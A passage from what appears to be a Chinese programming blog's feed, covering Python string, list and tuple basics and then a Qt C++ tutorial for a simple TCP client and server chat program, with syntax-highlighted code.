color="#fb8c00">\n</font>换行</p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"let\'s go"</span><span class="token punctuation">)</span></code></pre><blockquote><p>注：计算字符串长度时，每个转义序列当作一个字符。反斜杠不被认为是一个字符，而是指示器告诉python对跟随其后的字符进行特殊处理</p></blockquote><h4 id="原始字符串"><a href="#原始字符串" class="headerlink" title="原始字符串"></a>原始字符串</h4><pre class=" language-bash"><code class="language-bash">str <span class="token operator">=</span> r<span class="token string">'C:\now'</span>   <span class="token comment" spellcheck="true"># \n将不会被识别为转义字符</span></code></pre><h3 id="索引和切片"><a href="#索引和切片" class="headerlink" title="索引和切片"></a>索引和切片</h3><p>子字符串或切片是字符串中连续字符的一个序列。如果str1是一个字符串，str1[m:n]是以位置m开始，到位置n-1结束的子字符串。</p><blockquote><p>注：若m&gt;=n，即位置m对应的字符串不在位置n对应的字符串左边，则str1[m:n]表示空字符串(“”)。</p></blockquote><h4 id="find-rfind函数"><a href="#find-rfind函数" class="headerlink" title="find/rfind函数"></a>find/rfind函数</h4><ul><li>subStr是一个字符串，str1.find(subStr)表示从左向右搜索字符串str1，并返回subStr首次出现的正向索引位置。</li><li>str1.rfind(subStr)将从右向左搜索字符串，并返回subStr首次出现的正向索引位置。</li><li>如果subStr不在str1中，则find()/rfind()函数返回值为-1。<pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#python</span>print<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>,<span class="token string">"python"</span><span class="token punctuation">[</span>5<span class="token punctuation">]</span><span class="token punctuation">)</span>,<span class="token string">"python"</span><span class="token punctuation">[</span>2:4<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#y n th</span>str1 <span class="token operator">=</span> <span class="token string">"hello world"</span>print<span class="token punctuation">(</span>str1.find<span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">))</span>   <span class="token comment" spellcheck="true">#6</span>print<span class="token punctuation">(</span>str1.find<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">))</span>     <span class="token comment" spellcheck="true">#-1</span>print<span class="token punctuation">(</span>str1.rfind<span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">))</span>    <span class="token comment" spellcheck="true">#9</span></code></pre></li></ul><h4 id="反向索引"><a href="#反向索引" class="headerlink" title="反向索引"></a>反向索引</h4><p>反向索引最右端的字符索引值为-1，它左边的一个字符索引值为-2，以此类推</p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">[</span>-1<span class="token punctuation">]</span>,<span class="token string">"python"</span><span class="token punctuation">[</span>-5,-2<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#o yth</span></code></pre><blockquote><p>注：除Python外其他语言不允许反向索引 </p></blockquote><h4 id="切片默认边界"><a href="#切片默认边界" class="headerlink" title="切片默认边界"></a>切片默认边界</h4><p>str[:n]包括了从字符串首到str[n-1]字符之间的所有字符，str[m:]包含了从str[m]到到字符串末尾的所有字符，str[:]表示整个str字符串</p><blockquote><p>注：python不允许字符串中单个字符的索引越界，但是在切片中可以索引越界</p></blockquote><h3 id="字符串连接与重复"><a href="#字符串连接与重复" class="headerlink" title="字符串连接与重复"></a>字符串连接与重复</h3><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"good"</span>+<span class="token string">"bye"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#goodbye</span></code></pre><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"ha"</span>*4<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#hahahaha</span></code></pre><blockquote><p>注：字符串不能与一个数字进行连接操作</p></blockquote><h3 id="字符串函数和方法"><a href="#字符串函数和方法" class="headerlink" title="字符串函数和方法"></a>字符串函数和方法</h3><ul><li><font color="#fb8c00">len(str)</font> 返回str中的字符个数</li><li><font color="#fb8c00">str.upper()</font> 将str转换为大写字母</li><li><font color="#fb8c00">str.lower()</font>  将str转换为小写字母</li><li><font color="#fb8c00">str.rstrip()</font> 移除字符串末尾的换行符</li></ul><blockquote><p>注：字符串中的字符无法直接修改</p></blockquote><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><h3 id="字符串转整形"><a href="#字符串转整形" class="headerlink" title="字符串转整形"></a>字符串转整形</h3><pre class=" language-bash"><code class="language-bash">a <span class="token operator">=</span> <span class="token string">'123'</span>b <span class="token operator">=</span> int<span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#强制转换</span></code></pre><h3 id="浮点数转整数"><a href="#浮点数转整数" class="headerlink" title="浮点数转整数"></a>浮点数转整数</h3><pre class=" language-bash"><code class="language-bash">a <span class="token operator">=</span> 5.11b <span class="token operator">=</span> int<span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#最终b为5</span></code></pre><h3 id="整形转字符串"><a href="#整形转字符串" class="headerlink" title="整形转字符串"></a>整形转字符串</h3><pre class=" language-bash"><code class="language-bash">a <span class="token operator">=</span> 11b <span class="token operator">=</span> str<span class="token punctuation">(</span>a<span class="token punctuation">)</span>  </code></pre><blockquote><p>注：其他转换以此类推</p></blockquote><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ul><li>列表(list)是python对象的一个有序序列，其中对象可以是任何类型，并不要求类型一致。</li><li>列表用中括号括起来，每个元素之间用逗号分隔。<pre class=" language-bash"><code class="language-bash">team <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"hello"</span>,2019,<span class="token string">"world"</span>,2019<span class="token punctuation">]</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span>1,2,3,4<span class="token punctuation">]</span>words <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"hello"</span>,<span class="token string">"python"</span><span class="token punctuation">]</span></code></pre></li></ul><h3 id="列表操作"><a href="#列表操作" class="headerlink" title="列表操作"></a>列表操作</h3><p>以上述列表为例进行操作</p><ul><li><font color="#fb8c00">len()</font> 列表中元素个数<pre class=" language-bash"><code class="language-bash">len<span class="token punctuation">(</span>words<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#2</span></code></pre></li><li><font color="#fb8c00">max()</font> 最大值(元素必须是相同类型)<pre class=" language-bash"><code class="language-bash">max<span class="token punctuation">(</span>nums<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#4</span></code></pre></li><li><font color="#fb8c00">min()</font> 最小值(元素必须是相同类型)<pre class=" language-bash"><code class="language-bash">min<span class="token punctuation">(</span>nums<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#1</span></code></pre></li></ul><blockquote><p>注：当max与min作用于包含字符串的列表时，字符串按字典排序进行比较</p></blockquote><ul><li><font color="#fb8c00">sum()</font> 求和(元素必须是数字)<pre class=" language-bash"><code class="language-bash">sum<span class="token punctuation">(</span>nums<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#10</span></code></pre></li><li><font color="#fb8c00">count()</font> 一个对象出现的次数<pre class=" language-bash"><code class="language-bash">team.count<span class="token punctuation">(</span>2019<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#2</span></code></pre></li><li><font color="#fb8c00">index()</font>  一个对象首次出现的索引位置<pre class=" language-bash"><code class="language-bash">team.index<span class="token punctuation">(</span>2019<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#1</span></code></pre></li><li><font color="#fb8c00">reverse()</font> 所有元素的逆序<pre class=" language-bash"><code class="language-bash">words.reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#["python","hello"]</span></code></pre></li><li><font color="#fb8c00">append()</font> 在列表末端插入对象<pre class=" language-bash"><code class="language-bash">words.append<span class="token punctuation">(</span>2019<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#["hello","python",2019]</span></code></pre></li><li><font color="#fb8c00">extend()</font> 在列表末端插入新列表的所有元素<pre class=" language-bash"><code class="language-bash">nums.extend<span class="token punctuation">(</span><span class="token punctuation">[</span>7,8<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#[1,2,3,4,7,8]</span></code></pre></li><li><font color="#fb8c00">del()</font>  移除给定索引位置上的元素<pre class=" language-bash"><code class="language-bash">del team<span class="token punctuation">[</span>-1<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#["hello",2019,"world"]</span></code></pre></li><li><font color="#fb8c00">remove()</font> 移除一个对象的首次出现<pre class=" language-bash"><code class="language-bash">team.remove<span class="token punctuation">(</span>2019<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#["hello","world",2019]</span></code></pre></li><li><font color="#fb8c00">insert(索引位置，元素)</font> 在给定索引位置上插入新元素<pre class=" language-bash"><code class="language-bash">words.insert<span class="token punctuation">(</span>1,2019<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#["hello",2019,"python"]</span></code></pre></li><li><font color="#fb8c00">+</font> 连接<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token string">"hello"</span>,2019<span class="token punctuation">]</span>+<span class="token punctuation">[</span><span class="token string">"world"</span>,2020<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#等同于["hello",2019].extend("world",2020)</span></code></pre></li><li><font color="#fb8c00">*</font> 列表重复<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>0<span class="token punctuation">]</span>*3   <span class="token comment" spellcheck="true">#[0,0,0] </span></code></pre></li></ul><blockquote><p>注：在执行del/remove()方法后，列表中被删除元素后的其他元素会依次向左移动一个位置</p></blockquote><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>切片是由冒号语法表示的子列表<br><font color="#fb8c00">del list1[m:n]</font> 移除list1中从索引m到n-1的所有元素  </p><h3 id="split和join方法"><a href="#split和join方法" class="headerlink" title="split和join方法"></a>split和join方法</h3><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>split将字符串变成其子串组成的列表<br><font color="#fb8c00">L = strVar.split(分隔符)</font></p><pre class=" language-bash"><code class="language-bash">print<span class="token punctuation">(</span><span class="token string">"a,b,c"</span>.split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">))</span>  <span class="token comment" spellcheck="true">#['a','b','c']</span></code></pre><blockquote><p>注：三种常用的单字符分隔符为’,’ / 换行符’\n’ / 空格，若没有指定分隔符，将使用空白分隔符(换行符、制表符和空格组成的任意字符串)作为分隔符</p></blockquote><h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>join是split方法的逆操作，将一个字符串列表变成一个由列表中所有元素用指定分隔符分割连接成的字符串<br><font color="#fb8c00">strVar = “,”.join(L)</font></p><pre class=" language-bash"><code class="language-bash">line <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span>,<span class="token string">'b'</span>,<span class="token string">'c'</span><span class="token punctuation">]</span>print<span class="token punctuation">(</span><span class="token string">" "</span>.join<span class="token punctuation">(</span>line<span class="token punctuation">))</span> <span class="token comment" spellcheck="true">#["a b c"]</span>print<span class="token punctuation">(</span><span class="token string">","</span>.join<span class="token punctuation">(</span>line<span class="token punctuation">))</span>  <span class="token comment" spellcheck="true">#["a,b,c"]</span></code></pre><h2 id="元组对象"><a href="#元组对象" class="headerlink" title="元组对象"></a>元组对象</h2><ul><li>元组(tuple)与列表类似，是元素的有序列表。</li><li>元组与列表的主要区别在于元组不可以直接修改，即元组没有append,extend和insert方法</li><li>元组中的元素也不可以直接被修改或删除</li><li>列表中其他的函数和方法对元组同样适用</li><li>元组中的元素可以索引</li><li>元组可以切片、连接和重复</li><li>元组比列表更高效，因此应该在元素不会发生改变的情况下使用，它们执行得更快、内存占用更少，而且可以写“写保护”数据</li></ul><blockquote><p>注：单个元素组成的元组有一个末尾的逗号，如(0,)</p></blockquote><h3 id="元组定义"><a href="#元组定义" class="headerlink" title="元组定义"></a>元组定义</h3><pre class=" language-bash"><code class="language-bash">t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'a'</span>,<span class="token string">'b'</span>,<span class="token string">'c'</span><span class="token punctuation">)</span>或t<span class="token operator">=</span><span class="token string">'a'</span>,<span class="token string">'b'</span>,<span class="token string">'c'</span></code></pre><blockquote><p>注：print函数总会显示由括号包围的元组</p></blockquote><h3 id="tuple函数"><a href="#tuple函数" class="headerlink" title="tuple函数"></a>tuple函数</h3><p>tuple函数可以将列表或字符串转化为元组。</p><pre class=" language-bash"><code class="language-bash">tuple<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  的值为 <span class="token punctuation">(</span><span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">)</span>tuple<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">)</span> 的值为<span class="token punctuation">(</span><span class="token string">'p'</span>,<span class="token string">'y'</span>,<span class="token string">'t'</span>,<span class="token string">'h'</span>,<span class="token string">'o'</span>,<span class="token string">'n'</span><span class="token punctuation">)</span></code></pre><h2 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h2><p>列表和元组中的元素也可以是列表或元组</p><pre class=" language-bash"><code class="language-bash">regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"hello"</span>,2019<span class="token punctuation">)</span>,<span class="token punctuation">(</span><span class="token string">"world"</span>,<span class="token string">"python"</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>2020,1999<span class="token punctuation">)</span><span class="token punctuation">]</span>print<span class="token punctuation">(</span>regions<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#hello</span>print<span class="token punctuation">(</span>regiions<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#2020</span>print<span class="token punctuation">(</span>regions<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>+regions<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#2019+1999=4018</span></code></pre><h2 id="不可变对象和可变对象"><a href="#不可变对象和可变对象" class="headerlink" title="不可变对象和可变对象"></a>不可变对象和可变对象</h2><ul><li>对象是一个可以存储数据并有可以操纵数据的操作或方法实体。数值、字符串、列表和元组都是对象。</li><li>当一个变量使用赋值语句创建出来后，等号右边的值变成了内存中的一个对象</li><li>列表能够原地修改，但是数值、字符串和元组不可以。</li><li>能够原地修改的对象称为可变的，而不能原地修改的对象称为不可变的。<pre class=" language-bash"><code class="language-bash">L <span class="token operator">=</span><span class="token punctuation">[</span>5,6<span class="token punctuation">]</span>n <span class="token operator">=</span> 2s <span class="token operator">=</span> <span class="token string">"python"</span>t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'a'</span>,<span class="token string">'b'</span>,<span class="token string">'c'</span><span class="token punctuation">)</span>L.append<span class="token punctuation">(</span>7<span class="token punctuation">)</span>n +<span class="token operator">=</span> 1s <span class="token operator">=</span> s.upper<span class="token punctuation">(</span><span class="token punctuation">)</span>t <span class="token operator">=</span> t<span class="token punctuation">[</span>1:<span class="token punctuation">]</span></code></pre>在前四行代码执行后的内存分配情况<br><img src="https://i.postimg.cc/25zCdvNw/1.png" alt=""></li></ul><p>在全部代码执行后的内存分配情况<br><img src="https://i.postimg.cc/MGdq9TW8/2.jpg" alt=""></p><h2 id="列表复制"><a href="#列表复制" class="headerlink" title="列表复制"></a>列表复制</h2><pre class=" language-bash"><code class="language-bash">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> list1list2<span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'c'</span>print<span class="token punctuation">(</span>list1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># ['a','c']</span></code></pre><p>在第二行代码中，变量list2引用的是和list1一样的内存位置，对list2中一个元素的改变将对list1产生相同的变化<br>如果将第二行代码改成 </p><pre class=" language-bash"><code class="language-bash">list2 <span class="token operator">=</span> list<span class="token punctuation">(</span>list1<span class="token punctuation">)</span>或list2 <span class="token operator">=</span> list1<span class="token punctuation">[</span>:<span class="token punctuation">]</span></code></pre><blockquote><p>注：list函数可以将元组或字符串转化为列表。例如：list((‘a’,’b’))的值为[‘a’,’b’] list(“python”)的值为[‘p’,’y’,’t’,’h’,’o’,’n’]</p></blockquote><p>就不会出现上述情况，在这种情况下，list2指向了包含与list1一样的值，但list2是一个在不同内存位置上的对象，之后list1仍为[‘a’,’b’]</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt(进阶3)</title>
      <link href="/2019/09/01/qt5/"/>
      <url>/2019/09/01/qt5/</url>
      
        <content type="html"><![CDATA[<h2 id="Qt下的TCP通信过程"><a href="#Qt下的TCP通信过程" class="headerlink" title="Qt下的TCP通信过程"></a>Qt下的TCP通信过程</h2><p><img src="https://i.postimg.cc/85x5b5Hz/1.jpg" alt=""></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="界面展示"><a href="#界面展示" class="headerlink" title="界面展示"></a>界面展示</h3><p><img src="https://i.postimg.cc/9XqzQdmR/2.jpg" alt=""></p><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><ol><li><p>在.pro文件中加入</p><pre class=" language-bash"><code class="language-bash">QT +<span class="token operator">=</span> network</code></pre></li><li><p>server.h</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ifndef SERVER_H</span><span class="token comment" spellcheck="true">#define SERVER_H</span><span class="token comment" spellcheck="true">#include &lt;QWidget></span><span class="token comment" spellcheck="true">#include &lt;QTcpServer></span><span class="token comment" spellcheck="true">#include &lt;QTcpSocket></span>namespace Ui <span class="token punctuation">{</span>class Server<span class="token punctuation">;</span><span class="token punctuation">}</span>class Server <span class="token keyword">:</span> public QWidget<span class="token punctuation">{</span> Q_OBJECTpublic: explicit Server<span class="token punctuation">(</span>QWidget *parent <span class="token operator">=</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span> ~Server<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private slots: void on_pushButton_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> void on_pushButton_2_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private: Ui::Server *ui<span class="token punctuation">;</span> QTcpServer *tcpServer<span class="token punctuation">;</span> QTcpSocket *tcpSocket<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#endif // SERVER_H</span></code></pre></li><li><p>server.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "server.h"</span><span class="token comment" spellcheck="true">#include "ui_server.h"</span>Server::Server<span class="token punctuation">(</span>QWidget *parent<span class="token punctuation">)</span> <span class="token keyword">:</span> QWidget<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>, ui<span class="token punctuation">(</span>new Ui::Server<span class="token punctuation">)</span><span class="token punctuation">{</span> ui-<span class="token operator">></span>setupUi<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span> tcpServer <span class="token operator">=</span> NULL<span class="token punctuation">;</span> tcpSocket <span class="token operator">=</span> NULL<span class="token punctuation">;</span> tcpServer <span class="token operator">=</span> new QTcpServer<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>//监听套接字 tcpServer -<span class="token operator">></span>listen<span class="token punctuation">(</span>QHostAddress::Any,8888<span class="token punctuation">)</span><span class="token punctuation">;</span>//监听，指定端口 setWindowTitle<span class="token punctuation">(</span><span class="token string">"服务器:8888"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> connect<span class="token punctuation">(</span>tcpServer,<span class="token operator">&amp;</span>QTcpServer::newConnection,<span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     //取出创建好连接的套接字     tcpSocket <span class="token operator">=</span> tcpServer-<span class="token operator">></span>nextPendingConnection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //获取对方的IP、端口     QString ip<span class="token operator">=</span> tcpSocket-<span class="token operator">></span>peerAddress<span class="token punctuation">(</span><span class="token punctuation">)</span>.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     qint16 port<span class="token operator">=</span>tcpSocket-<span class="token operator">></span>peerPort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     QString temp <span class="token operator">=</span> QString<span class="token punctuation">(</span><span class="token string">"[%1:%2]:成功连接."</span><span class="token punctuation">)</span>.arg<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>.arg<span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>     ui-<span class="token operator">></span>read_edit-<span class="token operator">></span>setText<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>     connect<span class="token punctuation">(</span>tcpSocket,<span class="token operator">&amp;</span>QTcpSocket::readyRead,<span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         QByteArray array <span class="token operator">=</span> tcpSocket-<span class="token operator">></span>readAll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         ui-<span class="token operator">></span>write_edit-<span class="token operator">></span>setText<span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span> //服务器发送来的信息写在write_edit里     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Server::~Server<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> delete ui<span class="token punctuation">;</span><span class="token punctuation">}</span>void Server::on_pushButton_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> if<span class="token punctuation">(</span>NULL <span class="token operator">==</span> tcpSocket<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> QString str <span class="token operator">=</span> ui-<span class="token operator">></span>write_edit-<span class="token operator">></span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //给客户端发送数据 tcpSocket-<span class="token operator">></span>write<span class="token punctuation">(</span>str.toUtf8<span class="token punctuation">(</span><span class="token punctuation">)</span>.data<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void Server::on_pushButton_2_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> if<span class="token punctuation">(</span>tcpSocket <span class="token operator">==</span> NULL<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> //主动与客户端断开连接、 tcpSocket-<span class="token operator">></span>disconnectFromHost<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> tcpSocket-<span class="token operator">></span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> tcpSocket<span class="token operator">=</span>NULL<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ol><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ol><li><p>client.h</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ifndef CLIENT_H</span><span class="token comment" spellcheck="true">#define CLIENT_H</span><span class="token comment" spellcheck="true">#include &lt;QTcpSocket></span><span class="token comment" spellcheck="true">#include &lt;QWidget></span>namespace Ui <span class="token punctuation">{</span>class Client<span class="token punctuation">;</span><span class="token punctuation">}</span>class Client <span class="token keyword">:</span> public QWidget<span class="token punctuation">{</span> Q_OBJECTpublic: explicit Client<span class="token punctuation">(</span>QWidget *parent <span class="token operator">=</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span> ~Client<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private slots: void on_pushButton_3_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> void on_pushButton_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> void on_pushButton_2_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private: Ui::Client *ui<span class="token punctuation">;</span> QTcpSocket *tcpSocket<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#endif // CLIENT_H</span></code></pre></li><li><p>client.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "client.h"</span><span class="token comment" spellcheck="true">#include "ui_client.h"</span><span class="token comment" spellcheck="true">#include &lt;QHostAddress></span>Client::Client<span class="token punctuation">(</span>QWidget *parent<span class="token punctuation">)</span> <span class="token keyword">:</span> QWidget<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>, ui<span class="token punctuation">(</span>new Ui::Client<span class="token punctuation">)</span><span class="token punctuation">{</span> ui-<span class="token operator">></span>setupUi<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Client::~Client<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> delete ui<span class="token punctuation">;</span><span class="token punctuation">}</span>void Client::on_pushButton_3_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> tcpSocket<span class="token operator">=</span> NULL<span class="token punctuation">;</span> tcpSocket <span class="token operator">=</span> new QTcpSocket<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span> connect<span class="token punctuation">(</span>tcpSocket,<span class="token operator">&amp;</span>QTcpSocket::connected,<span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     ui-<span class="token operator">></span>textEdit-<span class="token operator">></span>setText<span class="token punctuation">(</span><span class="token string">"成功与服务器建立连接"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> connect<span class="token punctuation">(</span>tcpSocket,<span class="token operator">&amp;</span>QTcpSocket::readyRead,<span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     QByteArray array <span class="token operator">=</span> tcpSocket-<span class="token operator">></span>readAll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     ui-<span class="token operator">></span>textEdit_2-<span class="token operator">></span>setText<span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>//将服务器发送的内容写在textEdit_2中 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//获取服务器IP和端口 QString ip <span class="token operator">=</span> ui-<span class="token operator">></span>ip_line-<span class="token operator">></span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> qint16 port <span class="token operator">=</span> ui-<span class="token operator">></span>port_line-<span class="token operator">></span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>.toInt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //主动与服务器建立连接 tcpSocket-<span class="token operator">></span>connectToHost<span class="token punctuation">(</span>QHostAddress<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>,port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void Client::on_pushButton_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> QString str <span class="token operator">=</span> ui-<span class="token operator">></span>textEdit_2-<span class="token operator">></span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> tcpSocket-<span class="token operator">></span>write<span class="token punctuation">(</span>str.toUtf8<span class="token punctuation">(</span><span class="token punctuation">)</span>.data<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>//给服务器端发送信息<span class="token punctuation">}</span>void Client::on_pushButton_2_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> tcpSocket-<span class="token operator">></span>disconnectFromHost<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> tcpSocket-<span class="token operator">></span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
